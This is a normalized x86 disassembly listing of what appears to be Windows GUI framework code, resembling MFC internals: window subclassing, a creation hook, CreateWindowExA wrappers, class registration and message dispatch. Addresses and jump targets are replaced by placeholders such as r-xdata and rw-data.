push 0x0
call [ eax + 0x5c ]
push 0x7
mov eax [ ebp + 0x18 ]
lea edi [ ebx + 0x34 ]
pop ecx
lea esi [ ebp - 0x40 ]
[ edi ] [ esi ]
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x14
push [ ebp + 0x8 ]
lea eax [ ebp - 0x24 ]
push eax
push edi
call sub_41c8ba
jmp r-xdata
sub_41cab4
call sub_41ad89
mov ecx [ ebp - 0x14 ]
mov edx [ eax ]
add ecx 0x34
push ecx
mov ecx eax
push [ ebp + 0xc ]
call [ edx + 0x6c ]
mov ecx [ ebp + 0xc ]
mov [ ebp + 0x18 ] eax
call sub_41f64a
mov eax r-xdata
retn
sub_41cafd
push esi
push sub_422741
mov ecx rw-data
call sub_423575
mov esi eax
call [ GetMessageTime@IAT ]
mov [ esi + 0x44 ] eax
call [ GetMessagePos@IAT ]
movsx ecx ax
shr eax 0x10
movsx eax ax
mov [ esi + 0x48 ] ecx
mov [ esi + 0x4c ] eax
lea eax [ esi + 0x34 ]
pop esi
retn
sub_41cb32
push esi
mov esi ecx
push sub_422741
mov ecx rw-data
call sub_423575
push [ eax + 0x40 ]
mov edx [ esi ]
mov ecx esi
push [ eax + 0x3c ]
push [ eax + 0x38 ]
call [ edx + 0xa0 ]
pop esi
retn
sub_41cb59
mov eax sub_425eb2
call sub_40cc20
push esi
call sub_422d8a
mov esi eax
cmp [ esi + 0x14 ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push ebx
push sub_421452
call sub_41b7f4
push 0x48
mov ebx eax
call sub_41b806
pop ecx
mov ecx eax
mov [ ebp + 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push 0x1
push 0x1c
push r--data
call sub_41f850
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov [ esi + 0x14 ] eax
call sub_41b7f4
pop ebx
sub_41cbcb
push esi
push edi
push 0x1
call sub_41cb59
mov esi eax
push [ esp + 0xc ]
mov ecx esi
call sub_41f8b5
mov edi eax
push esi
mov ecx edi
call sub_41f3a5
mov eax edi
pop edi
pop esi
retn 0x4
sub_41cc10
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
test ebx ebx
jne r-xdata
push edi
push 0x1
call sub_41cb59
mov edi eax
push ebx
mov [ esi + 0x1c ] ebx
lea ecx [ edi + 0x4 ]
call sub_41aa98
push edi
mov ecx esi
mov [ eax ] esi
call sub_41f3a5
push 0x1
pop eax
pop edi
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn 0x4
sub_41cc49
push esi
mov esi ecx
push edi
mov edi [ esi + 0x1c ]
test edi edi
je r-xdata
and [ esi + 0x38 ] 0x0
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_41cb59
test eax eax
je r-xdata
and [ esi + 0x1c ] 0x0
push [ esi + 0x1c ]
lea ecx [ eax + 0x4 ]
call sub_41aae8
sub_41cc77
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x360
jne r-xdata
push [ ebp + 0x8 ]
call sub_41cbf2
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_41ca0a
push 0x1
pop eax
jmp r-xdata
pop ebp
retn 0x10
sub_41ccac
mov eax sub_425ebc
call sub_40cc20
sub esp 0x40
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi r--data
mov [ ebp - 0x10 ] esp
push esi
push edi
call [ GetPropA@IAT ]
and [ ebp - 0x14 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
push 0x1
sub eax 0x6
pop ebx
je r-xdata
push [ ebp + 0x14 ]
call sub_41cbcb
push edi
mov esi eax
call sub_41cbcb
push esi
push [ ebp + 0x10 ]
push eax
call sub_41c933
sub eax 0x1a
je r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x10
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push [ ebp - 0x18 ]
call [ CallWindowProcA@IAT ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
push edi
call sub_41cbcb
mov ecx [ ebp + 0x14 ]
shr ecx 0x10
push ecx
movsx ecx [ ebp + 0x14 ]
push ecx
push eax
call sub_41c994
xor ebx ebx
test eax eax
sete bl
jmp r-xdata
sub eax 0x62
je r-xdata
test ebx ebx
je r-xdata
push [ ebp - 0x18 ]
push 0xfffffffc
push edi
call [ SetWindowLongA@IAT ]
push esi
push edi
call [ RemovePropA@IAT ]
push esi
call [ GlobalFindAtomA@IAT ]
push eax
call [ GlobalDeleteAtom@IAT ]
jmp r-xdata
sub eax 0x8e
jne r-xdata
push edi
call sub_41cbcb
mov esi eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push esi
call sub_41c897
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x110
push edi
push [ ebp - 0x18 ]
call [ CallWindowProcA@IAT ]
push [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x30 ]
push eax
push esi
call sub_41c8ba
sub_41cdcf
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x40 ] eax
call sub_41ad89
mov edx [ eax ]
lea ecx [ ebp - 0x4c ]
push ecx
mov ecx eax
push [ ebp - 0x20 ]
call [ edx + 0x6c ]
mov ecx [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
call sub_41f64a
mov eax r-xdata
retn
sub_41ce0b
push ebp
mov ebp esp
push esi
push edi
push sub_422a5b
mov ecx rw-data
call sub_42360a
mov edi [ ebp + 0xc ]
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_41ccac
cmp edi 0x135
je r-xdata
push [ esi + 0x8 ]
push eax
lea eax [ edi - 0x132 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_41e79a
test eax eax
je r-xdata
cmp edi 0x136
je r-xdata
mov eax [ esi + 0x4 ]
jmp r-xdata
cmp edi 0x138
je r-xdata
pop edi
pop esi
pop ebp
retn 0x10
cmp edi 0x137
je r-xdata
cmp edi 0x134
jne r-xdata
sub_41ce87
push ebp
mov ebp esp
sub esp 0x10
push sub_422741
mov ecx rw-data
call sub_423575
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp + 0x10 ]
push ebx
push esi
mov esi [ eax + 0x14 ]
push edi
mov edi [ ecx ]
call sub_422d64
movzx eax [ eax + 0x14 ]
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
test esi esi
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ eax + 0x2c ]
call [ CallNextHookEx@IAT ]
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
test [ edi + 0x23 ] 0x40
jne r-xdata
leave
retn 0xc
test esi esi
je r-xdata
push 0xffffffe6
push ebx
call [ GetClassLongA@IAT ]
test eax 0x10000
jne r-xdata
mov esi [ ebp - 0x4 ]
test eax eax
jne r-xdata
push 0xfffffffc
push ebx
call [ GetWindowLongA@IAT ]
test eax eax
mov [ ebp + 0x8 ] eax
je r-xdata
push ebx
mov ecx esi
call sub_41cc10
mov eax [ esi ]
mov ecx esi
call [ eax + 0x50 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x80 ]
cmp [ rw-data ] 0x0
mov [ ebp + 0xc ] eax
jne r-xdata
mov eax [ edi + 0x28 ]
mov ecx eax
shr ecx 0x10
test cx cx
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
push [ esi + 0x2c ]
call [ UnhookWindowsHookEx@IAT ]
and [ esi + 0x2c ] 0x0
mov edi [ GetPropA@IAT ]
mov esi r--data
push esi
push ebx
call edi
test eax eax
jne r-xdata
call sub_41cca6
mov esi eax
push esi
push 0xfffffffc
push ebx
call [ SetWindowLongA@IAT ]
cmp eax esi
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push r--data
push eax
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
and [ ebp - 0x10 ] cl
lea eax [ ebp - 0x10 ]
push 0x5
push eax
mov ax [ edi + 0x28 ]
push eax
call [ GlobalGetAtomNameA@IAT ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x8 ]
push esi
push ebx
call [ SetPropA@IAT ]
push esi
push ebx
call edi
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
and [ esi + 0x14 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov edi [ rw-data ]
test edi edi
je r-xdata
push esi
call [ GlobalAddAtomA@IAT ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28 ] 0x0
mov eax sub_41ce0b
jne r-xdata
push [ ebp + 0x10 ]
push ebx
push 0x3
push [ esi + 0x2c ]
call [ CallNextHookEx@IAT ]
cmp [ ebp - 0x8 ] 0x0
mov edi eax
je r-xdata
cmp [ edi + 0x20 ] 0x0
je r-xdata
push eax
push 0xfffffffc
push ebx
call [ SetWindowLongA@IAT ]
mov eax sub_41ccac
push 0x0
push 0x0
push 0x36f
push ebx
push esi
call sub_41ca0a
test eax eax
mov [ ebp - 0x10 ] eax
je r-xdata
call sub_41cca6
push 0xfffffffc
push ebx
mov [ ebp + 0x8 ] eax
call [ GetWindowLongA@IAT ]
push [ ebp - 0x10 ]
mov esi eax
sub esi [ ebp + 0x8 ]
push ebx
neg esi
sbb esi esi
inc esi
call [ edi + 0x20 ]
test esi esi
jne r-xdata
push [ ebp + 0x8 ]
push 0xfffffffc
push ebx
call [ SetWindowLongA@IAT ]
jmp r-xdata
sub_41d07d
push esi
push edi
push sub_422741
mov ecx rw-data
call sub_423575
mov esi eax
mov edi [ esp + 0xc ]
cmp [ esi + 0x14 ] edi
je r-xdata
pop edi
pop esi
retn 0x4
cmp [ esi + 0x2c ] 0x0
jne r-xdata
mov [ esi + 0x14 ] edi
call [ GetCurrentThreadId@IAT ]
push eax
push 0x0
push sub_41ce87
push 0x5
call [ SetWindowsHookExA@IAT ]
test eax eax
mov [ esi + 0x2c ] eax
jne r-xdata
call sub_41a429
sub_41d0c9
push esi
push sub_422741
mov ecx rw-data
call sub_423575
mov esi eax
call sub_422d64
cmp [ eax + 0x14 ] 0x0
je r-xdata
cmp [ esi + 0x14 ] 0x0
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push 0x1
pop eax
pop esi
retn
and [ esi + 0x14 ] 0x0
xor eax eax
pop esi
retn
push eax
call [ UnhookWindowsHookEx@IAT ]
and [ esi + 0x2c ] 0x0
sub_41d10b
push ebp
mov ebp esp
sub esp 0x30
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x28 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x2c ]
mov esi ecx
mov [ ebp - 0x28 ] eax
call sub_422d64
mov eax [ eax + 0x8 ]
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0x30 ]
mov [ ebp - 0x30 ] eax
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x5c ]
test eax eax
jne r-xdata
push edi
push esi
call sub_41d07d
push [ ebp - 0x30 ]
push [ ebp - 0x2c ]
push [ ebp - 0x28 ]
push [ ebp - 0x24 ]
push [ ebp - 0x20 ]
push [ ebp - 0x1c ]
push [ ebp - 0x18 ]
push [ ebp - 0x14 ]
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call [ CreateWindowExA@IAT ]
mov edi eax
call sub_41d0c9
test eax eax
jne r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0xa4 ]
xor eax eax
jmp r-xdata
xor eax eax
test edi edi
setne al
pop edi
mov eax [ esi ]
mov ecx esi
call [ eax + 0xa4 ]
pop esi
leave
retn 0x2c
sub_41d1f1
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
push esi
test eax eax
push edi
jne r-xdata
mov edi [ eax + 0x1c ]
xor edi edi
jmp r-xdata
push [ ebp + 0x20 ]
mov eax [ ebp + 0x14 ]
push [ ebp + 0x1c ]
mov edx [ eax + 0x4 ]
mov esi [ eax ]
push edi
mov edi [ eax + 0xc ]
mov eax [ eax + 0x8 ]
sub edi edx
sub eax esi
push edi
push eax
mov eax [ ebp + 0x10 ]
push edx
or eax 0x40000000
push esi
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push 0x0
call sub_41d10b
pop edi
pop esi
pop ebp
retn 0x1c
sub_41d23d
mov eax sub_425ed0
call sub_40cc20
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0x1c ] 0x0
je r-xdata
mov ecx [ esi + 0x34 ]
test ecx ecx
je r-xdata
cmp esi rw-data
je r-xdata
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
cmp esi rw-data
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_41b355
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
cmp [ eax + 0x24 ] esi
jne r-xdata
cmp esi rw-data
je r-xdata
and [ eax + 0x24 ] 0x0
cmp esi rw-data
je r-xdata
call sub_41d3fb
sub_41d2b9
push esi
mov esi ecx
mov ecx [ esi + 0x34 ]
test ecx ecx
je r-xdata
and [ esi + 0x34 ] 0x0
mov ecx esi
call sub_41cb32
pop esi
retn
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_41d2d7
push ebp
mov ebp esp
sub esp 0x2c
push ebx
push esi
push edi
mov esi ecx
call sub_41ad89
mov edi eax
xor ebx ebx
cmp edi ebx
je r-xdata
mov ecx [ esi + 0x30 ]
cmp ecx ebx
je r-xdata
cmp [ edi + 0x1c ] esi
jne r-xdata
mov ecx [ esi + 0x34 ]
push 0x1
test ecx ecx
pop ebx
je r-xdata
mov eax [ ecx ]
call [ eax + 0x50 ]
mov [ esi + 0x30 ] ebx
cmp [ edi + 0x20 ] esi
jne r-xdata
call sub_422d64
cmp [ eax + 0x14 ] bl
jne r-xdata
and [ esi + 0x34 ] 0x0
test [ esi + 0x24 ] bl
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
mov [ edi + 0x20 ] ebx
mov [ edi + 0x1c ] ebx
call sub_422d64
cmp edi [ eax + 0x4 ]
jne r-xdata
mov edi [ GetWindowLongA@IAT ]
push 0xfffffffc
push [ esi + 0x1c ]
call edi
mov ecx esi
mov ebx eax
call sub_41cb32
push 0xfffffffc
push [ esi + 0x1c ]
call edi
cmp eax ebx
jne r-xdata
call sub_422b32
mov edi [ eax + 0xcc ]
test edi edi
je r-xdata
push ebx
call sub_425a0d
call sub_42218b
test eax eax
je r-xdata
mov ecx esi
call sub_41cc49
mov eax [ esi ]
mov ecx esi
call [ eax + 0xa4 ]
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi ]
mov ecx esi
call [ eax + 0x80 ]
mov eax [ eax ]
test eax eax
je r-xdata
cmp [ edi + 0x1c ] 0x0
je r-xdata
push eax
push 0xfffffffc
push [ esi + 0x1c ]
call [ SetWindowLongA@IAT ]
push 0x2c
lea eax [ ebp - 0x2c ]
push 0x0
push eax
call sub_40cc70
mov eax [ esi + 0x1c ]
add esp 0xc
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x2c ] 0x28
push eax
push 0x0
push 0x405
mov [ ebp - 0x28 ] ebx
push [ edi + 0x1c ]
call [ SendMessageA@IAT ]
sub_41d3fb
push esi
mov esi ecx
cmp [ esi + 0x1c ] 0x0
jne r-xdata
push ebx
push edi
push 0x0
call sub_41cb59
push [ esi + 0x1c ]
lea ecx [ eax + 0x4 ]
call sub_41aa65
mov ecx [ esi + 0x38 ]
mov edi eax
test ecx ecx
jne r-xdata
xor eax eax
pop esi
retn
mov eax [ ecx ]
call [ eax + 0x50 ]
push [ esi + 0x1c ]
call [ DestroyWindow@IAT ]
jmp r-xdata
mov eax ebx
pop edi
pop ebx
pop esi
retn
mov ecx esi
call sub_41cc49
test edi edi
mov ebx eax
jne r-xdata
sub_41d448
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x28 ]
test eax eax
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ esi + 0x1c ]
push eax
call [ CallWindowProcA@IAT ]
mov eax [ esi ]
call [ eax + 0x80 ]
mov eax [ eax ]
test eax eax
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ esi + 0x1c ]
call [ DefWindowProcA@IAT ]
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_41d4b2
push esi
call sub_422b32
mov esi eax
mov eax [ esi + 0xcc ]
test eax eax
je r-xdata
cmp [ esp + 0x8 ] 0x0
mov esi [ esi + 0x108 ]
je r-xdata
mov eax [ eax + 0x1c ]
test eax eax
je r-xdata
pop esi
retn 0x4
test esi esi
je r-xdata
push 0x0
push 0x0
push 0x401
push eax
call [ SendMessageA@IAT ]
push 0x1
call [ GetKeyState@IAT ]
test ax ax
jl r-xdata
mov eax [ esi ]
push 0xffffffff
mov ecx esi
call [ eax + 0xdc ]
sub_41d509
push ebp
mov ebp esp
push ebx
push edi
push [ ebp + 0xc ]
mov ebx ecx
push [ ebp + 0x8 ]
push [ ebx + 0x1c ]
call sub_421336
mov edi eax
test edi edi
je r-xdata
or eax 0xffffffff
push esi
push edi
call [ GetDlgCtrlID@IAT ]
mov esi [ ebp + 0x10 ]
movzx eax ax
test esi esi
mov [ ebp + 0xc ] eax
je r-xdata
mov eax [ ebp + 0xc ]
pop esi
jmp r-xdata
cmp [ esi ] 0x28
jb r-xdata
pop edi
pop ebx
pop ebp
retn 0xc
mov eax [ ebx + 0x1c ]
or [ esi + 0x4 ] 0x1
or [ esi + 0x24 ] 0xffffffff
push 0x0
push 0x0
push 0x87
push edi
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edi
call [ SendMessageA@IAT ]
test ah 0x20
jne r-xdata
or [ esi + 0x4 ] 0x80000002
sub_41d57a
push esi
mov esi [ esp + 0xc ]
push edi
mov edi ecx
cmp [ esi ] 0x1
jne r-xdata
push 0x0
push [ esi + 0x14 ]
call sub_41e27d
test eax eax
jne r-xdata
push [ esi + 0x14 ]
call sub_41f542
test eax eax
je r-xdata
pop edi
pop esi
retn 0x8
mov ecx edi
call sub_41cb32
mov edx [ eax ]
push esi
mov ecx eax
call [ edx + 0xc ]
jmp r-xdata
sub_41d5b7
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push esi
push eax
mov eax [ ebp + 0xc ]
mov esi ecx
push [ eax + 0x8 ]
call sub_41e27d
test eax eax
je r-xdata
mov ecx esi
call sub_41cb32
mov eax [ ebp + 0xc ]
jmp r-xdata
pop esi
pop ebp
retn 0x8
sub_41d601
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_41cb32
lea eax [ ebp + 0xc ]
push eax
call sub_41e250
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_41d62c
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
push [ esi + 0x4 ]
call [ GetMenuItemCount@IAT ]
mov ebx eax
xor edi edi
test ebx ebx
jle r-xdata
xor eax eax
push edi
push [ esi + 0x4 ]
call [ GetSubMenu@IAT ]
push eax
call sub_41f52d
test eax eax
je r-xdata
push edi
push [ esi + 0x4 ]
call [ GetMenuItemID@IAT ]
cmp eax [ esp + 0x14 ]
je r-xdata
push [ esp + 0x14 ]
push eax
call sub_41d62c
test eax eax
jne r-xdata
push [ esi + 0x4 ]
call sub_41f542
jmp r-xdata
inc edi
cmp edi ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn 0x8
jmp r-xdata
sub_41d68f
push esi
mov esi [ esp + 0xc ]
push edi
mov edi ecx
cmp [ esi ] 0x1
jne r-xdata
mov esi [ esi + 0x4 ]
push 0x1
push esi
push [ edi + 0x1c ]
call sub_41e0e8
test eax eax
je r-xdata
push sub_422741
mov ecx rw-data
call sub_423575
mov ecx [ edi + 0x1c ]
cmp [ eax + 0x50 ] ecx
jne r-xdata
mov ecx edi
call sub_41cb32
push 0x0
mov ecx eax
call sub_41e250
test eax eax
jne r-xdata
push ecx
call [ GetMenu@IAT ]
push eax
push [ eax + 0x54 ]
jmp r-xdata
pop edi
pop esi
retn 0x8
mov edx [ eax ]
push esi
mov ecx eax
call [ edx + 0x10 ]
jmp r-xdata
call sub_41f52d
push [ esi + 0x8 ]
push eax
call sub_41d62c
test eax eax
je r-xdata
sub_41d707
mov eax sub_425edc
call sub_40cc20
sub esp 0x30
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x10 ] esp
push eax
push [ esi + 0x24 ]
push [ esi + 0x10 ]
call [ GetClassInfoA@IAT ]
test eax eax
jne r-xdata
push 0x1
pop eax
push esi
call [ RegisterClassA@IAT ]
test ax ax
jne r-xdata
call sub_422d64
xor ebx ebx
cmp [ eax + 0x14 ] bl
je r-xdata
xor eax eax
jmp r-xdata
push 0x1
call sub_4238a9
mov [ ebp - 0x4 ] ebx
call sub_422d64
push [ esi + 0x24 ]
mov esi [ lstrcatA@IAT ]
lea edi [ eax + 0x34 ]
push edi
call esi
lea eax [ ebp + 0xa ]
mov [ ebp + 0xa ] 0xa
push eax
push edi
mov [ ebp + 0xb ] bl
call esi
or [ ebp - 0x4 ] 0xffffffff
push 0x1
call sub_423919
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
sub_41d798
push 0x1
call sub_423919
xor ebx ebx
push ebx
push ebx
call sub_40da39
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
push sub_422741
mov ecx rw-data
mov [ ebp - 0xc ] eax
call sub_423575
mov eax [ eax + 0x38 ]
lea ecx [ ebp - 0xc ]
sub eax 0x132
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
push 0x0
push 0x19
mov ecx esi
call [ eax + 0x98 ]
pop esi
leave
retn 0x8
sub_41d7ee
mov eax sub_425ef0
call sub_40cc20
push ecx
push ebx
push esi
mov esi ecx
call sub_422d64
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
call sub_422d64
mov ecx [ eax + 0x4 ]
call sub_41b5a7
mov eax [ esi ]
xor ebx ebx
mov ecx esi
mov [ ebp - 0x4 ] ebx
call [ eax + 0xb0 ]
test eax eax
je r-xdata
push edi
mov edi [ SendMessageA@IAT ]
push ebx
push ebx
push 0x1f
push [ esi + 0x1c ]
call edi
push 0x1
push 0x1
push ebx
push ebx
push 0x1f
push [ esi + 0x1c ]
call sub_41e161
mov ecx esi
call sub_41e07f
push ebx
mov esi eax
push ebx
push 0x1f
push [ esi + 0x1c ]
call edi
push 0x1
push 0x1
push ebx
push ebx
push 0x1f
push [ esi + 0x1c ]
call sub_41e161
call [ GetCapture@IAT ]
cmp eax ebx
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0xf0 ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push [ ebp + 0xc ]
push [ eax + 0x8c ]
push [ esi + 0x1c ]
call [ WinHelpA@IAT ]
test eax eax
pop edi
jne r-xdata
push ebx
push ebx
push 0x1f
push eax
call edi
or [ ebp - 0x4 ] 0xffffffff
call sub_422d64
mov ecx [ eax + 0x4 ]
call sub_41b5bc
mov ecx [ ebp - 0xc ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x8
push 0xffffffff
push ebx
push 0xf107
call sub_421acb
sub_41d8d6
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
xor eax eax
mov [ ebp + 0x8 ] eax
cmp eax [ ebx ]
je r-xdata
cmp edx [ ebx + 0x4 ]
jne r-xdata
add ebx 0x18
jmp r-xdata
cmp ecx [ ebx + 0x8 ]
jb r-xdata
cmp [ ebx + 0x10 ] 0x0
je r-xdata
cmp ecx [ ebx + 0xc ]
ja r-xdata
mov [ ebp + 0x8 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop ebx
pop ebp
retn 0x10
sub_41d916
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
lea ecx [ ebp - 0x4 ]
and [ ebp - 0x4 ] 0x0
mov eax [ esi ]
push ecx
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0x9c ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
pop esi
leave
retn 0xc
push [ ebp + 0x10 ]
mov eax [ esi ]
mov ecx esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0xa0 ]
mov [ ebp - 0x4 ] eax
sub_41d95a
mov eax sub_425f14
call sub_40cc20
sub esp 0x54
and [ ebp - 0x10 ] 0x0
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
cmp ebx 0x111
mov edi ecx
jne r-xdata
cmp ebx 0x4e
jne r-xdata
push [ ebp + 0x10 ]
mov eax [ edi ]
push [ ebp + 0xc ]
call [ eax + 0x78 ]
test eax eax
je r-xdata
mov esi [ ebp + 0x10 ]
cmp ebx 0x6
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp ebx 0x20
jne r-xdata
push esi
call sub_41cbcb
push eax
push [ ebp + 0xc ]
push edi
call sub_41c933
mov edx [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
push [ ebp + 0xc ]
mov ecx edi
call [ edx + 0x7c ]
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x28 ]
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov ebx eax
mov eax 0x1ff
and ebx eax
and ecx eax
push 0x7
xor ebx ecx
call sub_4238a9
mov ecx [ ebp + 0x8 ]
lea eax [ ebx + ebx * 2 ]
cmp ecx [ eax * 4 + rw-data ]
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebp - 0x14 ]
jne r-xdata
mov eax esi
shr eax 0x10
push eax
movsx eax si
push eax
push edi
call sub_41c994
test eax eax
jne r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
jmp r-xdata
test eax eax
mov [ ebx ] ecx
mov [ ebx + 0x8 ] eax
je r-xdata
cmp eax [ ebx + 0x8 ]
jne r-xdata
push 0x1
pop eax
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ eax ] ecx
and [ ebx + 0x4 ] 0x0
push 0x7
call sub_423919
jmp r-xdata
mov ebx [ ebx + 0x4 ]
push 0x7
mov [ ebp + 0x10 ] ebx
call sub_423919
test ebx ebx
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x10
mov edx 0xc000
cmp ecx edx
jae r-xdata
cmp [ ebp + 0x8 ] 0xc000
jb r-xdata
mov eax [ eax + 0x4 ]
push 0x0
push 0x0
push edx
push eax
call sub_41d8d6
test eax eax
mov [ ebp + 0x10 ] eax
je r-xdata
push 0x0
push 0x0
push ecx
push [ eax + 0x4 ]
call sub_41d8d6
test eax eax
mov [ ebp + 0x10 ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov ebx [ ebx + 0x14 ]
cmp [ ecx + 0x8 ] 0x1a
mov eax [ ecx + 0x10 ]
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
test eax eax
mov [ ebp - 0x14 ] eax
jne r-xdata
jmp r-xdata
push 0x7
mov [ ebx + 0x4 ] eax
call sub_423919
mov ebx [ ebp + 0x10 ]
